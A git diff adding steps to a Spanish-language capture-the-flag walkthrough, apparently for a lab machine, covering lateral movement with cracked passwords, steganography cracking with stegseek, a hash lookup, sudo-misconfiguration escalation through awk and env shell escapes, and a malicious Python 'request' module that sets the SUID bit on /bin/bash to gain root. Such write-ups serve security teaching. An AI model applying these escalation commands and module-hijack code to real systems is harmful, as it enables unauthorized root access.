@@ -96,6 +96,44 @@ Una vez que nos damos cuenta que no conseguimos nada fácilmente, pasamos a crea
 
 > El diccionario ganador fue `/usr/share/seclists/Passwords/Common-Credentials/best110.txt`
 
-Una vez con estos datos, proseguimos con `su - fernando ==> chocolate` y conseguimos Movimiento Lateral. Ahora, como `fernando` vemos que no tenemos Permisos Sudo corriendo (`sudo -l`) ni Binarios SUID relevantes en el sistema.  
+Una vez con estos datos, proseguimos con `su - fernando ==> chocolate` y conseguimos Movimiento Lateral. Ahora, como `fernando`, vemos que no tenemos Permisos Sudo corriendo (`sudo -l`) ni Binarios SUID relevantes en el sistema.  
 
-Ya habiendo probado algunas cosas, vemos que listando nuestro /home/fernando vemos un archivo de imagen llamado `dragon-medieval.jpeg` 
+Ya habiendo probado algunas cosas, vemos que listando nuestro /home/fernando vemos un archivo de imagen llamado `dragon-medieval.jpeg`. Parece ser nuestro Vector.  
+
+> Cuando el Vector trata de una imagen, pueden ser 2 cosas:
+> 1. Datos incrustados
+> 2. Steganografía
+
+Para el caso 1, probamos con la herramienta `binwalk`:  
+`binwalk dragon-medieval.jpeg`
+No obtenemos nada.  
+Seguimos con 2. Intetamos extraer cualquier información. Corremos:  
+`steghide extract -sf dragon-medieval.jpeg` y vemos que nos solicita una contraseña. Por lo tanto, corremos `stegseek -sf dragon-medieval.jpeg -wl <diccionario>` para intentar con un Ataque de Diccionario. Muy rápidamente, encontramos que la clave es `secret` y que el archivo oculto es `pass.txt`.  
+
+Ahora corremos nuevamente `steghide extract -sf dragon-medieval.jpeg` con password `secret` y nos extrae el archivito `pass.txt`. Le corremos `cat pass.txt`, nos da un hash. Ejecutamos `hashid <hash>` y nos muestra que trata un algoritmo SHA1. Vamos a la web https://crackstation.net/ y encontramos la clave: `password123`.  
+
+Ahora, suponiendo que se trata de la contraseña de otro usuario, probamos con el resto y confirmamos nuevas credenciales: `mario:password123`. Corremos `su - mario ==> password123` y somos `mario`.  
+
+Chequemos Permisos Sudo con `sudo -l` y encontramos:  
+> (julen) NOPASSWD: /usr/bin/awk
+
+Vamos a https://gtfobins.github.io/ y corremos: `sudo -u julen awk 'BEGIN {system("/bin/bash")}'`. Ahora somos `julen`. Desde aquí, volvemos a correr `sudo -l` y obtenemos: `(iker) NOPASSWD: /usr/bin/env`. Volvemos a verificar en dicha web y terminamos corriendo `sudo -u iker /usr/bin/env /bin/bash` y terminamos siendo `iker`. Ahora nueva, nuevamente `sudo -l` y obtenemos `(ALL) NOPASSWD: /usr/bin/python3 /home/iker/geo_ip.py`.  
+
+Ahora es un poquito diferente. Hacemos `cat /home/iker/geo_ip.py` y vemos que devuelve los datos de una IP dada. Lo probamos con `sudo usr/bin/python3 /home/iker/geo_ip.py`, le pasamos alguna IP válida y comprobamos.  
+
+Al leer dicho script vemos que importa el módulo `request`, por lo cual podemos intentar crear uno malicioso que contenga un código que nos permita finalmente Elevar Privilegios. Lo creamos en el mismo directorio, por ejemplo con `nano request.py`:  
+
+```
+#!/usr/bin/env python3
+
+import os;
+
+def get(cadena):
+    os.system("chmod u+s /bin/bash");
+    return "Bash alterada"
+
+```
+
+> Lo guardamos. No hace falta darle permisos de ejecución, porque el intérprete de Python3 sólo necesita poder leerlo.
+
+Ahora lo volvemos a correr con `sudo usr/bin/python3 /home/iker/geo_ip.py`, nos da un error sin importancia y ejecutamos `bash -p` y somos root. 
